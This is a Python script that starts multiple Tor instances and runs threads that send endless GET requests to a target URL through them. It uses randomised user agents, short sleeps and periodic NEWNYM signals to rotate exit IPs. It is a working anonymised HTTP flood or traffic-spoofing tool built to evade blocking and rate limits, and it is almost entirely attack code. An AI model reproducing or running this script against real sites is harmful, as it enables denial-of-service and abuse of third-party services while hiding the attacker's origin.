def start_tor_instance(index):
    socks_port = BASE_PORT + index * 2
    control_port = socks_port + 1
    data_dir = f"{DATA_DIR_BASE}{index}"

    os.makedirs(data_dir, exist_ok=True)

    torrc_content = f"""
SocksPort {socks_port}
ControlPort {control_port}
DataDirectory {data_dir}
HashedControlPassword {get_hashed_password()}
"""
    torrc_path = os.path.join(data_dir, "torrc")
    with open(torrc_path, "w") as f:
        f.write(torrc_content)

    subprocess.Popen(["tor", "-f", torrc_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[+] Launched Tor instance {index} on SOCKS:{socks_port} CTRL:{control_port}")

def get_hashed_password():
    # Generate once and hardcode it into script, or use `tor --hash-password`
    # This returns hash of "mypassword"
    return "$16:07C8F12D96C8BF66399D6C879DCF6E6BDE5BA3A4D65F78815BD10DF40A"

def renew_ip(control_port):
    try:
        with Controller.from_port(port=control_port) as c:
            c.authenticate(password=TOR_PASSWORD)
            c.signal(Signal.NEWNYM)
            print(f"[CTRL {control_port}] IP rotated.")
    except Exception as e:
        print(f"[CTRL {control_port}] IP rotate error: {e}")

def tor_worker(index):
    socks_port = BASE_PORT + index * 2
    control_port = socks_port + 1
    proxy = {
        "http": f"socks5h://127.0.0.1:{socks_port}",
        "https": f"socks5h://127.0.0.1:{socks_port}",
    }

    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            r = requests.get(target_url, headers=headers, proxies=proxy, timeout=10)
            print(f"[{socks_port}] {r.status_code}")
        except Exception as e:
            print(f"[{socks_port}] Error: {e}")
        time.sleep(random.uniform(0.3, 0.7))

        # Rotate sometimes
        if random.randint(1, 12) == 1:
            renew_ip(control_port)

def main():
    print("[*] Starting Tor instances...")
    for i in range(TOR_INSTANCES):
        start_tor_instance(i)
        time.sleep(0.2)  # give time to bind ports

    print("[*] Waiting for circuits to build...")
    time.sleep(15)

    print("[*] Launching request threads...")
    for i in range(TOR_INSTANCES):
        t = threading.Thread(target=tor_worker, args=(i,))
        t.start()

if __name__ == "__main__":
    main()
